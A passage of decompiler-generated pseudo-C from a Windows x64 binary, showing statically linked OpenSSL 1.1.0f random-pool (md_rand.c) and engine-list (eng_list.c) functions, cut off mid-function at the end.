_BOOL8 __fastcall sub_140040010(__int64 a1, unsigned int a2, __int64 a3, int a4)
{
  unsigned int v5; // [rsp+20h] [rbp-38h] BYREF
  int *v6; // [rsp+28h] [rbp-30h]
  int v7[2]; // [rsp+30h] [rbp-28h] BYREF
  __int64 v8; // [rsp+38h] [rbp-20h]
  int v9; // [rsp+40h] [rbp-18h]
  __int64 v10; // [rsp+60h] [rbp+8h] BYREF

  v10 = a1;
  v5 = a2;
  v8 = a3;
  v6 = v7;
  v9 = 0;
  v7[1] = 4;
  v7[0] = a4;
  return sub_14003F290((__int64)&unk_1400F65B0, &v5, &v10) != 0i64;
}

//----- (0000000140040070) ----------------------------------------------------
__int64 __fastcall sub_140040070(__int64 a1, _BYTE *a2, int a3)
{
  _DWORD *v6; // rax
  __int64 v7; // rbx

  v6 = sub_14004FEE0();
  v7 = (__int64)v6;
  if ( !v6 )
    return 0i64;
  if ( !(unsigned int)sub_14006B0A0((__int64)v6, a2, a3) )
  {
    sub_14004FD70(v7);
    return 0i64;
  }
  sub_14003F350(a1, 4, v7);
  return 1i64;
}

//----- (00000001400400F0) ----------------------------------------------------
void sub_1400400F0()
{
  sub_140023440((__int64)&unk_140142CE0, 1043i64);
  qword_140142C80 = 0i64;
  qword_140142C88 = 0i64;
  sub_140023440((__int64)&xmmword_140142CC8, 20i64);
  qword_140142C98 = 0i64;
  qword_140142C90 = 0i64;
  dword_140142CA0 = 0;
  sub_140025BE0((_DWORD *)qword_140142CA8);
  sub_140025BE0((_DWORD *)qword_140142CB0);
}
// 140142C80: using guessed type __int64 qword_140142C80;
// 140142C88: using guessed type __int64 qword_140142C88;
// 140142C90: using guessed type __int64 qword_140142C90;
// 140142C98: using guessed type __int64 qword_140142C98;
// 140142CA0: using guessed type int dword_140142CA0;
// 140142CA8: using guessed type __int64 qword_140142CA8;
// 140142CB0: using guessed type __int64 qword_140142CB0;
// 140142CC8: using guessed type __int128 xmmword_140142CC8;

//----- (0000000140040170) ----------------------------------------------------
__int64 __fastcall sub_140040170(__int64 a1, int a2)
{
  return sub_140040190(a1, a2, (double)a2);
}

//----- (0000000140040190) ----------------------------------------------------
__int64 __fastcall sub_140040190(__int64 a1, int a2, double a3)
{
  __int64 v3; // rdi
  __int64 v4; // r14
  __int64 *v6; // rsi
  int v7; // eax
  struct _exception *v8; // rcx
  int v9; // ebx
  BOOL v10; // ebx
  __int64 v11; // rbp
  unsigned __int64 v12; // rcx
  __int64 v13; // rax
  int v14; // r13d
  __int64 v15; // rbx
  int v16; // r12d
  int v17; // r14d
  int *v18; // rax
  __int64 v19; // rcx
  __int64 i; // rcx
  __int8 v21; // al
  __int64 v22; // rbx
  int v23; // eax
  __int64 v24; // rax
  __int64 v25; // rcx
  BOOL v26; // [rsp+20h] [rbp-88h]
  int v28; // [rsp+2Ch] [rbp-7Ch]
  __int128 v30; // [rsp+38h] [rbp-70h] BYREF
  int v31[2]; // [rsp+48h] [rbp-60h]

  v3 = 0i64;
  v4 = a2;
  if ( !a2 )
    return 1i64;
  v6 = (__int64 *)sub_14006DFD0();
  if ( v6 )
  {
    v7 = sub_140025C90(&dword_140142CA4, (void (*)(void))sub_140040730);
    v8 = 0i64;
    if ( v7 )
      v8 = (struct _exception *)(unsigned int)dword_140142CBC;
    if ( (_DWORD)v8 )
    {
      if ( dword_140142CB8 )
      {
        v9 = UserMathErrorFunction(v8);
        sub_140025C50((_DWORD *)qword_140142CB0);
        v10 = sub_140025B70(dword_140142CC4, v9);
        v26 = v10;
        sub_140025CE0((_DWORD *)qword_140142CB0);
        if ( v10 )
          goto LABEL_12;
      }
      else
      {
        v10 = 0;
        v26 = 0;
      }
      sub_140025D20((_DWORD *)qword_140142CA8);
LABEL_12:
      v11 = (int)qword_140142C88;
      v12 = v4 + qword_140142C88;
      v28 = HIDWORD(qword_140142C90);
      v31[0] = dword_140142CD8;
      qword_140142C88 = v12;
      v30 = xmmword_140142CC8;
      if ( v12 < 0x3FF )
      {
        v13 = qword_140142C80;
        if ( (unsigned __int64)qword_140142C80 < 0x3FF )
        {
          if ( v12 > qword_140142C80 )
            v13 = v12;
          qword_140142C80 = v13;
        }
      }
      else
      {
        qword_140142C80 = 1023i64;
        qword_140142C88 = v12 % 0x3FF;
      }
      HIDWORD(qword_140142C90) += (int)v4 / 20 + ((int)v4 % 20 > 0);
      if ( !v10 )
        sub_140025CE0((_DWORD *)qword_140142CA8);
      v14 = 0;
      if ( (int)v4 <= 0 )
      {
LABEL_41:
        if ( !v10 )
          sub_140025D20((_DWORD *)qword_140142CA8);
        v25 = 4i64;
        xmmword_140142CC8 = (__int128)_mm_xor_si128(
                                        _mm_loadu_si128((const __m128i *)&xmmword_140142CC8),
                                        _mm_loadu_si128((const __m128i *)&v30));
        do
        {
          *((_BYTE *)&xmmword_140142CC8 + v3 + 16) ^= *((_BYTE *)v31 + v3);
          ++v3;
          --v25;
        }
        while ( v25 );
        if ( *(double *)&qword_140142C98 < 32.0 )
          *(double *)&qword_140142C98 = *(double *)&qword_140142C98 + a3;
        if ( !v10 )
          sub_140025CE0((_DWORD *)qword_140142CA8);
        LODWORD(v3) = 1;
      }
      else
      {
        v15 = v11;
        v16 = v4;
        while ( 1 )
        {
          v17 = v16;
          if ( v16 > 20 )
            v17 = 20;
          v18 = (int *)sub_14005BAC0();
          if ( !(unsigned int)sub_14006DB20((__int64)v6, v18, 0i64) || !(unsigned int)sub_14006DD90((__int64)v6) )
            break;
          v19 = (__int64)v6;
          if ( v17 + (int)v11 - 1023 > 0 )
          {
            if ( !(unsigned int)sub_14006DD90((__int64)v6) )
              break;
            v19 = (__int64)v6;
          }
          if ( !(unsigned int)sub_14006DD90(v19)
            || !(unsigned int)sub_14006DD90((__int64)v6)
            || !(unsigned int)sub_14006DD90((__int64)v6)
            || !(unsigned int)sub_14006DA80(v6, (__int64)&v30, 0i64) )
          {
            break;
          }
          ++v28;
          a1 += v17;
          for ( i = 0i64; i < v17; v15 = v24 )
          {
            v21 = *((_BYTE *)&v31[-4] + i++);
            byte_140142CE0[v15] ^= v21;
            v22 = v15 + 1;
            v23 = v11 + 1;
            LODWORD(v11) = 0;
            if ( v22 < 1023 )
              LODWORD(v11) = v23;
            v24 = 0i64;
            if ( v22 < 1023 )
              v24 = v22;
          }
          v14 += 20;
          v16 -= 20;
          if ( v14 >= a2 )
          {
            v10 = v26;
            goto LABEL_41;
          }
        }
      }
    }
  }
  sub_14006DF90(v6);
  return (unsigned int)v3;
}
// 140142C80: using guessed type __int64 qword_140142C80;
// 140142C88: using guessed type __int64 qword_140142C88;
// 140142C90: using guessed type __int64 qword_140142C90;
// 140142C98: using guessed type __int64 qword_140142C98;
// 140142CA4: using guessed type _DWORD dword_140142CA4;
// 140142CA8: using guessed type __int64 qword_140142CA8;
// 140142CB0: using guessed type __int64 qword_140142CB0;
// 140142CB8: using guessed type int dword_140142CB8;
// 140142CC4: using guessed type int dword_140142CC4;
// 140142CC8: using guessed type __int128 xmmword_140142CC8;
// 140142CD8: using guessed type int dword_140142CD8;
// 140142CE0: using guessed type _BYTE byte_140142CE0[1048];

//----- (00000001400405C0) ----------------------------------------------------
__int64 __fastcall sub_1400405C0(_BYTE *a1, int a2)
{
  return sub_140040790(a1, a2, 0);
}

//----- (00000001400405E0) ----------------------------------------------------
__int64 __fastcall sub_1400405E0(_BYTE *a1, int a2)
{
  int v2; // eax

  return sub_140040790(a1, a2, v2 - 39);
}
// 1400405ED: variable 'v2' is possibly undefined

//----- (0000000140040600) ----------------------------------------------------
_BOOL8 sub_140040600()
{
  int v0; // eax
  struct _exception *v1; // rcx
  int v3; // ebx
  BOOL v4; // edi
  BOOL v5; // ebx

  v0 = sub_140025C90(&dword_140142CA4, (void (*)(void))sub_140040730);
  v1 = 0i64;
  if ( v0 )
    v1 = (struct _exception *)(unsigned int)dword_140142CBC;
  if ( !(_DWORD)v1 )
    return 0i64;
  v3 = UserMathErrorFunction(v1);
  if ( !dword_140142CB8 )
  {
    v4 = 0;
LABEL_9:
    sub_140025D20((_DWORD *)qword_140142CA8);
    sub_14002F5D0();
    sub_140025D20((_DWORD *)qword_140142CB0);
    dword_140142CC4 = v3;
    sub_140025CE0((_DWORD *)qword_140142CB0);
    dword_140142CB8 = 1;
    goto LABEL_10;
  }
  sub_140025C50((_DWORD *)qword_140142CB0);
  v4 = sub_140025B70(dword_140142CC4, v3);
  sub_140025CE0((_DWORD *)qword_140142CB0);
  if ( !v4 )
    goto LABEL_9;
LABEL_10:
  if ( !dword_140142CA0 )
  {
    sub_140075EF0();
    dword_140142CA0 = 1;
  }
  v5 = *(double *)&qword_140142C98 >= 32.0;
  if ( !v4 )
  {
    dword_140142CB8 = 0;
    sub_14002F640();
    sub_140025CE0((_DWORD *)qword_140142CA8);
  }
  return v5;
}
// 140142C98: using guessed type __int64 qword_140142C98;
// 140142CA0: using guessed type int dword_140142CA0;
// 140142CA4: using guessed type _DWORD dword_140142CA4;
// 140142CA8: using guessed type __int64 qword_140142CA8;
// 140142CB0: using guessed type __int64 qword_140142CB0;
// 140142CB8: using guessed type int dword_140142CB8;
// 140142CC4: using guessed type int dword_140142CC4;

//----- (0000000140040720) ----------------------------------------------------
__int64 (__fastcall **sub_140040720())()
{
  return off_140135520;
}
// 140135520: using guessed type __int64 (__fastcall *off_140135520[6])();

//----- (0000000140040730) ----------------------------------------------------
_DWORD *sub_140040730()
{
  _DWORD *result; // rax

  sub_14001E0C0(0, 0i64);
  qword_140142CA8 = (__int64)sub_140025C10();
  result = sub_140025C10();
  qword_140142CB0 = (__int64)result;
  if ( !qword_140142CA8 || (LODWORD(dword_140142CBC) = 1, !result) )
    LODWORD(dword_140142CBC) = 0;
  return result;
}
// 140142CA8: using guessed type __int64 qword_140142CA8;
// 140142CB0: using guessed type __int64 qword_140142CB0;

//----- (0000000140040790) ----------------------------------------------------
__int64 __fastcall sub_140040790(_BYTE *a1, int a2, int a3)
{
  void *v6; // rbp
  int v7; // eax
  int v8; // ecx
  struct _exception *v9; // rcx
  double v10; // xmm1_8
  __int64 v11; // rbx
  __int64 v12; // rbx
  unsigned __int64 v13; // r15
  unsigned __int64 v14; // rax
  int v15; // r14d
  int *v16; // rax
  __int64 v17; // rcx
  __int64 i; // rcx
  int *v19; // rax
  __time64_t v21; // [rsp+38h] [rbp-70h]
  struct _FILETIME SystemTimeAsFileTime; // [rsp+48h] [rbp-60h] BYREF
  __int128 v23; // [rsp+50h] [rbp-58h] BYREF
  int v24; // [rsp+60h] [rbp-48h]

  v21 = time64(0i64);
  GetSystemTimeAsFileTime(&SystemTimeAsFileTime);
  if ( a2 <= 0 )
    return 1i64;
  v6 = sub_14006DFD0();
  if ( !v6 )
    goto LABEL_53;
  v7 = sub_140025C90(&dword_140142CA4, (void (*)(void))sub_140040730);
  v8 = 0;
  if ( v7 )
    v8 = (int)dword_140142CBC;
  if ( !v8 )
  {
LABEL_53:
    sub_140024610(36, 100, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rand\\md_rand.c", 517);
    sub_14006DF90(v6);
    return 0i64;
  }
  sub_140025D20((_DWORD *)qword_140142CA8);
  sub_14002F5D0();
  sub_140025D20((_DWORD *)qword_140142CB0);
  dword_140142CC4 = UserMathErrorFunction(v9);
  sub_140025CE0((_DWORD *)qword_140142CB0);
  dword_140142CB8 = 1;
  if ( !dword_140142CA0 )
  {
    sub_140075EF0();
    dword_140142CA0 = 1;
  }
  v10 = *(double *)&qword_140142C98;
  if ( *(double *)&qword_140142C98 < 32.0 )
  {
    *(double *)&qword_140142C98 = *(double *)&qword_140142C98 - (double)a2;
    if ( *(double *)&qword_140142C98 < 0.0 )
      qword_140142C98 = 0i64;
  }
  if ( !dword_140142CC0 )
  {
    v11 = 52i64;
    do
    {
      sub_140040190((__int64)"....................", 20, 0.0);
      --v11;
    }
    while ( v11 );
    if ( v10 >= 32.0 )
      dword_140142CC0 = 1;
  }
  v12 = qword_140142C88;
  v13 = qword_140142C80;
  v14 = (int)(10
            * (((int)((unsigned __int64)(1717986919i64 * (a2 - 1)) >> 32) >> 2)
             + 1
             + ((unsigned int)((unsigned __int64)(1717986919i64 * (a2 - 1)) >> 32) >> 31)))
      + qword_140142C88;
  v24 = dword_140142CD8;
  qword_140142C88 = v14;
  v23 = xmmword_140142CC8;
  if ( v14 > qword_140142C80 )
    qword_140142C88 = v14 % qword_140142C80;
  LODWORD(qword_140142C90) = qword_140142C90 + 1;
  dword_140142CB8 = 0;
  sub_14002F640();
  sub_140025CE0((_DWORD *)qword_140142CA8);
  do
  {
    v15 = a2;
    if ( a2 >= 10 )
      v15 = 10;
    a2 -= v15;
    v16 = (int *)sub_14005BAC0();
    if ( !(unsigned int)sub_14006DB20((__int64)v6, v16, 0i64) )
      goto LABEL_52;
    if ( v21 )
    {
      if ( !(unsigned int)sub_14006DD90((__int64)v6) || !(unsigned int)sub_14006DD90((__int64)v6) )
        goto LABEL_52;
      v21 = 0i64;
    }
    if ( !(unsigned int)sub_14006DD90((__int64)v6) || !(unsigned int)sub_14006DD90((__int64)v6) )
      goto LABEL_52;
    v17 = (__int64)v6;
    if ( (int)v12 - (int)v13 + 10 > 0 )
    {
      if ( !(unsigned int)sub_14006DD90((__int64)v6) )
        goto LABEL_52;
      v17 = (__int64)v6;
    }
    if ( !(unsigned int)sub_14006DD90(v17) || !(unsigned int)sub_14006DA80((__int64 *)v6, (__int64)&v23, 0i64) )
      goto LABEL_52;
    for ( i = 0i64; i < 10; ++i )
    {
      byte_140142CE0[v12] ^= *((_BYTE *)&v23 + i);
      if ( ++v12 >= v13 )
        v12 = 0i64;
      if ( i < v15 )
        *a1++ = *((_BYTE *)&v23 + i + 10);
    }
  }
  while ( a2 > 0 );
  v19 = (int *)sub_14005BAC0();
  if ( !(unsigned int)sub_14006DB20((__int64)v6, v19, 0i64)
    || !(unsigned int)sub_14006DD90((__int64)v6)
    || !(unsigned int)sub_14006DD90((__int64)v6) )
  {
LABEL_52:
    sub_140024610(36, 100, 6, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rand\\md_rand.c", 513);
    sub_14006DF90(v6);
    return 0i64;
  }
  sub_140025D20((_DWORD *)qword_140142CA8);
  sub_14002F5D0();
  if ( !(unsigned int)sub_14006DD90((__int64)v6)
    || !(unsigned int)sub_14006DA80((__int64 *)v6, (__int64)&xmmword_140142CC8, 0i64) )
  {
    sub_140025CE0((_DWORD *)qword_140142CA8);
    goto LABEL_52;
  }
  sub_14002F640();
  sub_140025CE0((_DWORD *)qword_140142CA8);
  sub_14006DF90(v6);
  if ( v10 >= 32.0 )
    return 1i64;
  if ( !a3 )
  {
    sub_140024610(36, 100, 100, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\rand\\md_rand.c", 507);
    sub_140023A40(1, "You need to read the OpenSSL FAQ, https://www.openssl.org/docs/faq.html");
  }
  return 0i64;
}
// 140040883: variable 'v9' is possibly undefined
// 140142C80: using guessed type __int64 qword_140142C80;
// 140142C88: using guessed type __int64 qword_140142C88;
// 140142C90: using guessed type __int64 qword_140142C90;
// 140142C98: using guessed type __int64 qword_140142C98;
// 140142CA0: using guessed type int dword_140142CA0;
// 140142CA4: using guessed type _DWORD dword_140142CA4;
// 140142CA8: using guessed type __int64 qword_140142CA8;
// 140142CB0: using guessed type __int64 qword_140142CB0;
// 140142CB8: using guessed type int dword_140142CB8;
// 140142CC0: using guessed type int dword_140142CC0;
// 140142CC4: using guessed type int dword_140142CC4;
// 140142CC8: using guessed type __int128 xmmword_140142CC8;
// 140142CD8: using guessed type int dword_140142CD8;
// 140142CE0: using guessed type _BYTE byte_140142CE0[1048];

//----- (0000000140040CD0) ----------------------------------------------------
__int64 __fastcall sub_140040CD0()
{
  int v0; // eax

  return sub_1400417E0(&qword_1401430F8, v0 - 39);
}
// 140040CDD: variable 'v0' is possibly undefined
// 140040CD0: using guessed type __int64 __fastcall sub_140040CD0();
// 1401430F8: using guessed type __int64 qword_1401430F8;

//----- (0000000140040CF0) ----------------------------------------------------
__int64 __fastcall sub_140040CF0(__int64 a1)
{
  if ( *(_QWORD *)(a1 + 48) )
    return sub_140041620(&qword_1401430F8, (__int64)sub_140040DA0, a1, (int *)&unk_1400F66C0, 1, 0);
  else
    return 1i64;
}
// 1401430F8: using guessed type __int64 qword_1401430F8;

//----- (0000000140040D40) ----------------------------------------------------
__int64 __fastcall sub_140040D40(__int64 a1, __int64 a2)
{
  *(_QWORD *)(a1 + 48) = a2;
  return 1i64;
}

//----- (0000000140040D50) ----------------------------------------------------
__int64 __fastcall sub_140040D50(__int64 a1)
{
  if ( *(_QWORD *)(a1 + 48) )
    return sub_140041620(&qword_1401430F8, (__int64)sub_140040DA0, a1, (int *)&unk_1400F66C0, 1, 1);
  else
    return 1i64;
}
// 1401430F8: using guessed type __int64 qword_1401430F8;

//----- (0000000140040DA0) ----------------------------------------------------
__int64 sub_140040DA0()
{
  return sub_140041580(&qword_1401430F8);
}
// 1401430F8: using guessed type __int64 qword_1401430F8;

//----- (0000000140040DC0) ----------------------------------------------------
__int64 __fastcall sub_140040DC0(_QWORD *a1)
{
  int v1; // eax
  unsigned int v2; // edi

  v2 = v1 - 47;
  if ( !a1 )
  {
    sub_140024610(38, 105, v1 + 19, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_list.c", 219);
    return 0i64;
  }
  if ( !*a1 || !a1[1] )
  {
    sub_140024610(38, 105, 108, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_list.c", 223);
    return 0i64;
  }
  sub_140025D20((_DWORD *)qword_140147E80);
  if ( !(unsigned int)sub_1400412D0((__int64)a1) )
  {
    sub_140024610(38, 105, 110, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_list.c", 228);
    v2 = 0;
  }
  sub_140025CE0((_DWORD *)qword_140147E80);
  return v2;
}
// 140040DD3: variable 'v1' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140147E80: using guessed type __int64 qword_140147E80;

//----- (0000000140040E80) ----------------------------------------------------
__int64 __fastcall sub_140040E80(const char *a1)
{
  int v1; // eax
  int v4; // eax
  __int64 v5; // rdi
  int v6; // ecx
  __int64 v7; // rbx
  _QWORD *v8; // rax
  _QWORD *v9; // rcx
  int v10; // eax
  char v11; // al
  __int64 v12; // rax
  const char *v13; // rdi
  __int64 v14; // rax

  if ( a1 )
  {
    v4 = sub_140025C90(&dword_140142C34, (void (*)(void))sub_140034C60);
    v5 = 0i64;
    v6 = 0;
    if ( v4 )
      v6 = dword_140142C38;
    if ( v6 )
    {
      sub_140025D20((_DWORD *)qword_140147E80);
      v7 = qword_140143100;
      if ( qword_140143100 )
      {
        while ( strcmp(a1, *(const char **)v7) )
        {
          v7 = *(_QWORD *)(v7 + 184);
          if ( !v7 )
            goto LABEL_16;
        }
        if ( (*(_BYTE *)(v7 + 152) & 4) != 0 )
        {
          v8 = sub_140034A80();
          v9 = v8;
          if ( v8 )
          {
            *v8 = *(_QWORD *)v7;
            v8[1] = *(_QWORD *)(v7 + 8);
            v8[2] = *(_QWORD *)(v7 + 16);
            v8[3] = *(_QWORD *)(v7 + 24);
            v8[4] = *(_QWORD *)(v7 + 32);
            v8[5] = *(_QWORD *)(v7 + 40);
            v8[6] = *(_QWORD *)(v7 + 48);
            v8[7] = *(_QWORD *)(v7 + 56);
            v8[8] = *(_QWORD *)(v7 + 64);
            v8[9] = *(_QWORD *)(v7 + 72);
            v8[11] = *(_QWORD *)(v7 + 88);
            v8[12] = *(_QWORD *)(v7 + 96);
            v8[13] = *(_QWORD *)(v7 + 104);
            v8[14] = *(_QWORD *)(v7 + 112);
            v8[15] = *(_QWORD *)(v7 + 120);
            v8[16] = *(_QWORD *)(v7 + 128);
            v8[18] = *(_QWORD *)(v7 + 144);
            v10 = *(_DWORD *)(v7 + 152);
            v7 = (__int64)v9;
            *((_DWORD *)v9 + 38) = v10;
          }
          else
          {
            v7 = 0i64;
          }
        }
        else
        {
          ++*(_DWORD *)(v7 + 156);
        }
      }
LABEL_16:
      sub_140025CE0((_DWORD *)qword_140147E80);
      if ( v7 )
      {
        return v7;
      }
      else
      {
        while ( 1 )
        {
          v11 = a1[v5++];
          if ( v11 != aDynamic[v5 - 1] )
            break;
          if ( v5 == 8 )
            goto LABEL_20;
        }
        v12 = common_getenv<char>("OPENSSL_ENGINES");
        v13 = "D:\\opensource\\openssl-dist-1.1.0f-vs2017\\openssl-x64-static-release-vs2017\\lib\\engines-1_1";
        if ( v12 )
          v13 = (const char *)v12;
        v14 = sub_140040E80("dynamic");
        v7 = v14;
        if ( !v14
          || !(unsigned int)sub_140076280(v14, "ID", a1, 0)
          || !(unsigned int)sub_140076280(v7, "DIR_LOAD", "2", 0)
          || !(unsigned int)sub_140076280(v7, "DIR_ADD", v13, 0)
          || !(unsigned int)sub_140076280(v7, "LIST_ADD", "1", 0)
          || !(unsigned int)sub_140076280(v7, "LOAD", 0i64, 0) )
        {
LABEL_20:
          sub_1400349C0(v7);
          sub_140024610(38, 106, 116, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_list.c", 339);
          sub_140023A40(2, "id=", a1);
          return 0i64;
        }
        return v7;
      }
    }
    else
    {
      sub_140024610(38, 106, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_list.c", 291);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(v1 - 10, v1 + 58, v1 + 19, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_list.c", 287);
    return 0i64;
  }
}
// 140040EA9: variable 'v1' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140142C34: using guessed type _DWORD dword_140142C34;
// 140142C38: using guessed type int dword_140142C38;
// 140143100: using guessed type __int64 qword_140143100;
// 140147E80: using guessed type __int64 qword_140147E80;

//----- (00000001400411A0) ----------------------------------------------------
__int64 sub_1400411A0()
{
  int v0; // eax
  int v1; // ecx
  __int64 v3; // rbx

  v0 = sub_140025C90(&dword_140142C34, (void (*)(void))sub_140034C60);
  v1 = 0;
  if ( v0 )
    v1 = dword_140142C38;
  if ( v1 )
  {
    sub_140025D20((_DWORD *)qword_140147E80);
    v3 = qword_140143100;
    if ( qword_140143100 )
      ++*(_DWORD *)(qword_140143100 + 156);
    sub_140025CE0((_DWORD *)qword_140147E80);
    return v3;
  }
  else
  {
    sub_140024610(38, 195, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_list.c", 140);
    return 0i64;
  }
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140142C34: using guessed type _DWORD dword_140142C34;
// 140142C38: using guessed type int dword_140142C38;
// 140143100: using guessed type __int64 qword_140143100;
// 140147E80: using guessed type __int64 qword_140147E80;

//----- (0000000140041240) ----------------------------------------------------
__int64 __fastcall sub_140041240(__int64 a1)
{
  int v1; // eax
  __int64 v4; // rbx

  if ( a1 )
  {
    sub_140025D20((_DWORD *)qword_140147E80);
    v4 = *(_QWORD *)(a1 + 184);
    if ( v4 )
      ++*(_DWORD *)(v4 + 156);
    sub_140025CE0((_DWORD *)qword_140147E80);
    sub_1400349C0(a1);
    return v4;
  }
  else
  {
    sub_140024610(v1 - 10, v1 + 67, v1 + 19, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_list.c", 178);
    return 0i64;
  }
}
// 140041269: variable 'v1' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140147E80: using guessed type __int64 qword_140147E80;

//----- (00000001400412D0) ----------------------------------------------------
__int64 __fastcall sub_1400412D0(__int64 a1)
{
  BOOL v1; // eax
  __int64 result; // rax
  __int64 v4; // r9
  unsigned __int8 *v5; // rax
  int v6; // ecx
  int v7; // edx
  __int64 v8; // rax

  v1 = 0;
  if ( !a1 )
  {
    sub_140024610(38, 120, 67, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_list.c", 59);
    return 0i64;
  }
  v4 = qword_140143100;
  if ( qword_140143100 )
  {
    do
    {
      if ( v1 )
        goto LABEL_14;
      v5 = *(unsigned __int8 **)v4;
      do
      {
        v6 = v5[*(_QWORD *)a1 - *(_QWORD *)v4];
        v7 = *v5 - v6;
        if ( v7 )
          break;
        ++v5;
      }
      while ( v6 );
      v4 = *(_QWORD *)(v4 + 184);
      v1 = v7 == 0;
    }
    while ( v4 );
    if ( !v7 )
    {
LABEL_14:
      sub_140024610(38, 120, 103, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_list.c", 68);
      return 0i64;
    }
    v8 = qword_140143108;
    if ( qword_140143108 && !*(_QWORD *)(qword_140143108 + 184) )
    {
      *(_QWORD *)(qword_140143108 + 184) = a1;
      *(_QWORD *)(a1 + 176) = v8;
      goto LABEL_19;
    }
    sub_140024610(38, 120, 110, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_list.c", 86);
    return 0i64;
  }
  if ( qword_140143108 )
  {
    sub_140024610(38, 120, 110, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_list.c", 74);
    return 0i64;
  }
  *(_QWORD *)(a1 + 176) = 0i64;
  qword_140143100 = a1;
  sub_140034D10((__int64)sub_140041420);
LABEL_19:
  ++*(_DWORD *)(a1 + 156);
  result = 1i64;
  qword_140143108 = a1;
  *(_QWORD *)(a1 + 184) = 0i64;
  return result;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140143100: using guessed type __int64 qword_140143100;
// 140143108: using guessed type __int64 qword_140143108;

//----- (0000000140041420) ----------------------------------------------------
__int64 sub_140041420()
{
  __int64 result; // rax
  __int64 i; // rbx

  result = qword_140143100;
  for ( i = qword_140143100; qword_140143100; i = qword_140143100 )
  {
    sub_140025D20((_DWORD *)qword_140147E80);
    if ( !(unsigned int)sub_1400414A0(i) )
      sub_140024610(38, 123, 110, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_list.c", 245);
    sub_140025CE0((_DWORD *)qword_140147E80);
    result = qword_140143100;
  }
  return result;
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140143100: using guessed type __int64 qword_140143100;
// 140147E80: using guessed type __int64 qword_140147E80;

//----- (00000001400414A0) ----------------------------------------------------
__int64 __fastcall sub_1400414A0(__int64 a1)
{
  int v1; // eax
  __int64 v2; // rdx
  __int64 v3; // rax
  __int64 v5; // r8
  __int64 v6; // r8

  if ( !a1 )
  {
    sub_140024610(38, 121, v1 + 11, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_list.c", 108);
    return 0i64;
  }
  v2 = qword_140143100;
  v3 = qword_140143100;
  if ( !qword_140143100 )
    goto LABEL_6;
  while ( v3 != a1 )
  {
    v3 = *(_QWORD *)(v3 + 184);
    if ( !v3 )
      goto LABEL_6;
  }
  if ( !v3 )
  {
LABEL_6:
    sub_140024610(38, 121, 105, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\engine\\eng_list.c", 117);
    return 0i64;
  }
  v5 = *(_QWORD *)(a1 + 184);
  if ( v5 )
    *(_QWORD *)(v5 + 176) = *(_QWORD *)(a1 + 176);
  v6 = *(_QWORD *)(a1 + 176);
  if ( v6 )
    *(_QWORD *)(v6 + 184) = *(_QWORD *)(a1 + 184);
  if ( v2 == a1 )
    qword_140143100 = *(_QWORD *)(a1 + 184);
  if ( qword_140143108 == a1 )
    qword_140143108 = *(_QWORD *)(a1 + 176);
  sub_140034DF0(a1, 0);
  return 1i64;
}
// 1400414BA: variable 'v1' is possibly undefined
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);
// 140143100: using guessed type __int64 qword_140143100;
// 140143108: using guessed type __int64 qword_140143108;

//----- (0000000140041580) ----------------------------------------------------
__int64 __fastcall sub_140041580(__int64 *a1)
{
  sub_140025D20((_DWORD *)qword_140147E80);
  if ( *a1 )
  {
    sub_14003EBA0(*a1, sub_140041910);
    sub_14003ECA0(*a1);
    *a1 = 0i64;
  }
  return sub_140025CE0((_DWORD *)qword_140147E80);
}
// 140147E80: using guessed type __int64 qword_140147E80;

//----- (00000001400415E0) ----------------------------------------------------
void __fastcall sub_1400415E0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3[3]; // [rsp+20h] [rbp-18h] BYREF

  if ( a1 )
  {
    v3[0] = a2;
    v3[1] = a3;
    sub_14003EC10(a1, (void (__fastcall *)(_QWORD, __int64))sub_140041960, (__int64)v3);
  }
}

//----- (0000000140041620) ----------------------------------------------------
__int64 __fastcall sub_140041620(__int64 *a1, __int64 a2, __int64 a3, int *a4, int a5, int a6)
{
  unsigned int v10; // ebp
  _QWORD *v11; // rax
  int i; // esi
  __int64 v13; // rcx
  _QWORD *v14; // rbx
  _DWORD *v15; // rax
  _QWORD *v16; // rax
  __int64 v17; // rcx
  int v19[8]; // [rsp+30h] [rbp-38h] BYREF

  v10 = 0;
  sub_140025D20((_DWORD *)qword_140147E80);
  if ( !*a1 )
  {
    v11 = sub_14003EE70(
            (__int64 (__fastcall *)(char *))sub_14001D4F0,
            (int (__cdecl *)(const char *, const char *))sub_140024C80);
    if ( !v11 )
      goto LABEL_17;
    *a1 = (__int64)v11;
    sub_140034CA0(a2);
  }
  for ( i = a5; i; ++a4 )
  {
